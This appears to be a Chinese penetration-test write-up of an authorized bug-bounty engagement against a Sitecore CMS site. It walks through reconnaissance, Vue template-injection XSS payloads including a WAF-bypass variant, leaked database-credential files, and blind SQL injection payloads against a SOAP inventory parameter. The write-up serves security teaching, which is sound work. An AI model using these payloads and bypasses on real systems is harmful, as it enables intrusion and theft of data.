# SRC实战报告：Sitecore CMS完整渗透全过程

> **案例来源**：某大型企业SRC授权测试 | 渗透周期：7天  
> **关联知识**：[SQL注入全技巧](09-sql-injection.md) | [命令注入全技巧](11-command-injection.md) | [XSS全技巧](12-xss.md) | [安全配置错误（A05）全技巧](24-a05-security-misconfiguration.md)

---

## 一、案例概述

本次渗透测试针对某行业领头羊企业的主域名展开，历时**一周多**，最终通过**信息泄露 + SQL盲注**组合拳成功拿下敏感数据。核心教训：**柿子要挑软的捏，渗透测试思路最重要**。

---

## 二、信息收集阶段

### 2.1 主域名探针

| 操作 | 发现 | 分析 |
|:---|:---|:---|
| 访问主站 | 存在搜索框 | 测试点 +1 |
| 抓包分析 | 网站搭建了 **CDN**，存在特殊文件 | 难度 +1 |
| 识别CMS | 确认为 **Sitecore**（企业级CMS） | 需查找公开CVE |

### 2.2 CMS漏洞探测

找到唯一相关CVE：**CVE-2021-42237**（Sitecore XP 远程代码执行漏洞）

```bash
# 尝试POC利用
请求地址：/sitecore/shell/WebService/UserDatabase.asmx
# 结果：被服务器拒绝访问（做了敏感地址限制）
```

> 推断：`/Sitecore` 为Sitecore CMS后台地址目录，后续可尝试403绕过。

### 2.3 端口扫描

```bash
nmap -sV -p 1-65535 target.com
```

| 端口 | 服务 | 可访问性 |
|:---|:---|:---|
| 443 | HTTPS | ✅ 可访问 |
| 3306 | MySQL | ❌ 仅暴露端口 |
| 1723 | PPTP VPN | ❌ 内部使用 |

### 2.4 旁站与子域名收集

使用 **FOFA** 收集旁站：

```
domain="target.com" && status_code="200"
```

发现了**三个同模板站点**（相同CMS、相同功能），判断为开发者遗留的**测试环境**，未搭建WAF。

---

## 三、漏洞挖掘阶段

### 3.1 Vue模板注入（XSS）发现

在同模板测试站中发现 **Vue模板注入漏洞**：

```javascript
// 测试payload - 乘法运算验证
{{7*7}}
// 页面输出：49 ✅ 存在模板注入

// 弹窗验证
{{constructor.constructor('alert(1)')()}}
// 成功弹窗 ✅
```

#### WAF绕过（主站场景）

由于主站存在WAF，需要绕过：

```javascript
// 绕过payload（URL编码换行+Unicode编码）
{{constructor.constructor%0a('%5c%75%30%30%36%31%6c%65%72%74%31%27)()}}
```

> **本质**：虽然费了很大功夫，但这本质还只是一个**XSS漏洞**。

### 3.2 空白站点的意外收获

发现一个**完全空白的站点**，用后台扫描工具扫描：

```
Dirsearch扫到：
  /xxx/ - 网站的开发文件泄露（插件版本信息）
  /xxx.gif - GIF图片
```

查看网页源代码发现：**开发者ID值泄露** 🔓

### 3.3 SOAP Web Service接口发现

在FOFA上发现一个 **Service Web Service 接口**（.asmx）：

```
target.com/Service.asmx
```

接口暴露了：
- **文件上传接口**（UploadFile）
- **XML上传接口**
- **商品盘点接口**（StocktakingStart）

#### 文件上传测试（失败）

```java
// 尝试调用文件上传接口，构造SOAP请求
// 结果：对方服务器积极拒绝连接
// 原因：管理员对调用文件上传接口的IP做了限制
```

### 3.4 敏感文件泄露（重大突破）

用后台扫描工具扫出大量敏感文件：

| 路径 | 泄露内容 |
|:---|:---|
| `/log/` | 服务器日志文件 |
| `/data/` | 数据库文件 |
| `/data/Setting.xml` | **数据库用户名、密码、IP地址** 🔥 |
| `/old/` | 服务器名称、密码 |
| `/trace.axd` | 应用程序代码 |
| `/update/` | 系统内部文件、应用程序、DLL |
| `/update/Setting.xml` | 服务名、IP、计算机名、密码和内部IP地址 |

### 3.5 SQL注入漏洞（最终突破）

在商品盘点接口 `StocktakingStart` 的参数 `whcode` 处发现注入点：

#### 布尔盲注判断

```xml
<!-- 正常请求 -->
<whcode>94102</whcode> → StocktakingStartResult = 0（成功）

<!-- 错误数据 -->
<whcode>99999</whcode> → StocktakingStartResult = -1（失败）

<!-- 布尔判断1：真 -->
<whcode>-1' OR 1=1</whcode> → 返回 0 ✅

<!-- 布尔判断2：假 -->
<whcode>-1' OR 3+220-220-1=0+0+0+1</whcode> → 返回 -1 ❌

<!-- 布尔判断3：真 -->
<whcode>-1' OR 3*2=6 AND 000220=000220</whcode> → 返回 0 ✅
```

#### 无回显盲注利用

由于无回显，构造**ASCII码判断语句**：

```sql
-1' OR ASCII(SUBSTRC((SELECT NVL(CAST(user AS VARCHAR(4000)),CHR(32)) FROM aaaa),1,1))>0 AND 000360=000360 --
```

> 原理：用ASCII码大小逐字符判断用户名密码，已知信息泄露中拿到了数据库密码，反向验证一致。

---

## 四、Java辅助脚本

### SOAP请求发送脚本

```java
import java.io.*;
import java.net.*;

public class asmx {
    public static void main(String[] args) throws Exception {
        String url = "https://target.com/";
        String soapAction = "http://tempuri.org/StocktakingStart";
        String payload = "<?xml version=\"1.0\"?>"
            + "<soap12:Envelope xmlns:soap12=\"http://www.w3.org/2003/05/soap-envelope\""
            + " xmlns:tns=\"http://tempuri.org/\">"
            + "<soap12:Header /><soap12:Body>"
            + "<tns:StocktakingStart>"
            + "<tns:user>tsSLAueP</tns:user>"
            + "<tns:whcode>1</tns:whcode>"
            + "<tns:PDtype>1</tns:PDtype>"
            + "<tns:UNITCODE>94102</tns:UNITCODE>"
            + "<tns:BRANDCODE>94102</tns:BRANDCODE>"
            + "</tns:StocktakingStart>"
            + "</soap12:Body></soap12:Envelope>";
        
        // ... 发送请求并处理响应的代码
    }
}
```

---

## 五、实战经验总结

### 🎯 核心心法

| 原则 | 说明 |
|:---|:---|
| **柿子要挑软的捏** | 不要一开始就硬刚主站WAF，先找同模板测试站 |
| **信息收集决定成败** | 花了大量时间信息收集，最终从空白站+FOFA找到突破口 |
| **组合拳才是王道** | 信息泄露 → SQL注入，单一漏洞往往不够 |
| **手工测试不可替代** | 漏扫工具扫不到的漏洞点，手工才能发现 |

### 🚨 法律红线

> 挖掘SRC要注意分寸！必须在厂商授权范围内测试，获取到数据库权限后点到为止，**不要越界**，不然会有帽子叔叔来找你。

### 🔗 关联学习

- [命令注入全技巧](11-command-injection.md) - 命令注入的各种绕过方式
- [SQL注入全技巧](09-sql-injection.md) - SQL注入盲注高级技巧
- [安全配置错误（A05）全技巧](24-a05-security-misconfiguration.md) - 敏感文件泄露防御
- [安全日志与监控失效（A09）全技巧](28-a09-logging-monitoring.md) - 日志泄露的危害
